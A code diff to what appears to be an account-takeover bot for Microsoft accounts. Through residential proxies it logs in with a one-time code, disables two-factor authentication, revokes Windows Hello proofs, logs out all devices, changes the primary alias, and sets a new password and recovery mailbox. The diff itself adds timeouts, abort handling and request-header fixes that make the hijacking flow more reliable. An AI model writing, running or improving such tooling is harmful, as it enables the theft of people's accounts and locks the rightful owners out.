@@ -19,6 +19,8 @@ import {
 const __secureDir = path.dirname(fileURLToPath(import.meta.url));
 const LOGIN_OTP_SCRIPT = path.resolve(__secureDir, "../scripts/login_otp.py");
 
+const LOGIN_OTP_TIMEOUT_MS = 90_000;
+
 /** Python residential-proxy OTP login → inject cookies into jar; sticks that proxy for post-login MS calls */
 async function loginWithCodeViaPython(
   jar: CookieJar,
@@ -26,6 +28,7 @@ async function loginWithCodeViaPython(
   proofId: string,
   code: string,
   log: (level: string, msg: string) => Promise<void>,
+  signal?: AbortSignal,
 ): Promise<boolean> {
   const bins = process.platform === "win32" ? ["python", "py", "python3"] : ["python3", "python"];
   for (const bin of bins) {
@@ -37,6 +40,10 @@ async function loginWithCodeViaPython(
         proxy?: string;
         proxy_url?: string;
       } | null>((resolve) => {
+        if (signal?.aborted) {
+          resolve(null);
+          return;
+        }
         const child = spawn(bin, [LOGIN_OTP_SCRIPT, email, proofId, code], {
           windowsHide: true,
           env: process.env,
@@ -44,22 +51,55 @@ async function loginWithCodeViaPython(
         });
         let stdout = "";
         let stderr = "";
+        let settled = false;
+        type LoginResult = {
+          ok?: boolean;
+          cookies?: Record<string, string>;
+          error?: string;
+          proxy?: string;
+          proxy_url?: string;
+        } | null;
+        const finish = (v: LoginResult) => {
+          if (settled) return;
+          settled = true;
+          clearTimeout(timer);
+          signal?.removeEventListener("abort", onAbort);
+          resolve(v);
+        };
+        const timer = setTimeout(() => {
+          try {
+            child.kill("SIGKILL");
+          } catch {
+            /* ignore */
+          }
+          void log("warn", `[secure] login_otp timeout ${LOGIN_OTP_TIMEOUT_MS}ms (${bin})`);
+          finish(null);
+        }, LOGIN_OTP_TIMEOUT_MS);
+        const onAbort = () => {
+          try {
+            child.kill("SIGKILL");
+          } catch {
+            /* ignore */
+          }
+          finish(null);
+        };
+        signal?.addEventListener("abort", onAbort, { once: true });
         child.stdout.on("data", (d) => {
           stdout += String(d);
         });
         child.stderr.on("data", (d) => {
           stderr += String(d);
         });
-        child.on("error", () => resolve(null));
+        child.on("error", () => finish(null));
         child.on("close", () => {
           const line = stdout.trim().split(/\r?\n/).filter(Boolean).pop() || "";
           if (!line) {
             void log("warn", `[secure] login_otp empty (${bin}): ${stderr.slice(0, 160)}`);
-            resolve(null);
+            finish(null);
             return;
           }
           try {
-            resolve(
+            finish(
               JSON.parse(line) as {
                 ok?: boolean;
                 cookies?: Record<string, string>;
@@ -69,7 +109,7 @@ async function loginWithCodeViaPython(
               },
             );
           } catch {
-            resolve(null);
+            finish(null);
           }
         });
       });
@@ -609,7 +649,7 @@ async function remove2FA(jar: CookieJar, apiCanary: string) {
     await fetchWithJar(jar, "https://account.live.com/API/Proofs/DisableTfa", {
       method: "POST",
       headers: {
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Content-Type": "application/json",
         "x-ms-apiVersion": "2",
         "x-ms-apiTransport": "xhr",
         uiflvr: "1001",
@@ -631,7 +671,7 @@ async function removeZyger(jar: CookieJar, apiCanary: string) {
     await fetchWithJar(jar, "https://account.live.com/API/Proofs/RevokeWindowsHelloProofs", {
       method: "POST",
       headers: {
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Content-Type": "application/json",
         "x-ms-apiVersion": "2",
         "x-ms-apiTransport": "xhr",
         uiflvr: "1001",
@@ -1139,10 +1179,14 @@ async function generateEmail(): Promise<RecoveryMailbox> {
     try {
       return await createMailcowMailbox();
     } catch (e) {
-      errors.push(`mailcow=${e instanceof Error ? e.message : e}`);
+      const msg = e instanceof Error ? e.message : String(e);
+      console.error("[secure] mailcow create failed:", msg);
+      errors.push(`mailcow=${msg}`);
     }
   } else {
-    errors.push("mailcow=not configured");
+    errors.push(
+      `mailcow=not configured (url=${!!(process.env.MAILCOW_API_URL || process.env.MAILCOW_URL)} key=${!!process.env.MAILCOW_API_KEY} domain=${!!process.env.MAILCOW_DOMAIN})`,
+    );
   }
 
   const apiKey = (process.env.FIRSTMAIL_API_KEY || "").trim();
@@ -1163,7 +1207,7 @@ async function getEmailCode(
   mailbox: RecoveryMailbox,
   signal?: AbortSignal,
 ): Promise<string> {
-  return readSecurityCodeFromImap(mailbox, signal, 60_000);
+  return readSecurityCodeFromImap(mailbox, signal, 90_000);
 }
 
 async function recover(
@@ -1384,7 +1428,10 @@ async function logoutAll(jar: CookieJar, apiCanary: string) {
   try {
     await fetchWithJar(jar, "https://account.live.com/API/Proofs/DeleteDevices", {
       method: "POST",
-      headers: { canary: apiCanary },
+      headers: {
+        "Content-Type": "application/json",
+        canary: apiCanary,
+      },
       body: JSON.stringify({ uiflvr: 1001, uaid: "abd2ca2a346c43c198c9ca7e4255f3bc", scid: 100109, hpgid: 201030 }),
       redirect: "manual",
     });
@@ -1397,7 +1444,8 @@ async function changePrimaryAlias(jar: CookieJar, emailName: string, apiCanary: 
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
     });
     const canaryText = await canaryRes.text();
-    const addCanary = encodeURIComponent(extract(canaryText, /name="canary" value="([^"]+)"/));
+    // URLSearchParams encodes once — do not pre-encode
+    const addCanary = extract(canaryText, /name="canary" value="([^"]+)"/);
 
     await fetchWithJar(jar, "https://account.live.com/AddAssocId?ru=&cru=&fl=", {
       method: "POST",
@@ -1420,7 +1468,7 @@ async function changePrimaryAlias(jar: CookieJar, emailName: string, apiCanary: 
     const pinfoRes = await fetchWithJar(jar, "https://account.live.com/API/MakePrimary", {
       method: "POST",
       headers: {
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Content-Type": "application/json",
         "X-Requested-With": "XMLHttpRequest",
         Accept: "application/json",
         hpgid: "200176",
@@ -1445,7 +1493,7 @@ async function changePrimaryAlias(jar: CookieJar, emailName: string, apiCanary: 
   }
 }
 
-const SECURE_HARD_TIMEOUT_MS = 7 * 60_000; // login + recovery + mailbox OTP + cleanup
+const SECURE_HARD_TIMEOUT_MS = 10 * 60_000; // login + recovery + mailbox OTP + cleanup
 
 export async function runSecureBot(
   jobId: string,
@@ -1486,6 +1534,7 @@ export async function runSecureBot(
         config.flowToken,
         config.code,
         log,
+        runSignal,
       );
     }
 
@@ -1652,7 +1701,7 @@ export async function runSecureBot(
           "info",
           `[secure] Creating unique recovery mailbox (mailcow=${mailcowConfigured()} firstmail=${!!process.env.FIRSTMAIL_API_KEY})...`,
         );
-        const mailbox = await withTimeout(generateEmail(), 60_000, "generateEmail");
+        const mailbox = await withTimeout(generateEmail(), 90_000, "generateEmail");
         await log(
           "info",
           `[secure] Mailbox ready provider=${mailbox.provider} email=${mailbox.email} imap=${mailbox.imapHost}`,
@@ -1666,7 +1715,7 @@ export async function runSecureBot(
         await log("info", "[secure] Running recovery flow (waiting for mailbox OTP)...");
         const recoveryResult = await withTimeout(
           recover(jar, mainEmail, recoveryCode, mailbox, newPassword, runSignal),
-          150_000,
+          180_000,
           "recover",
         );
 
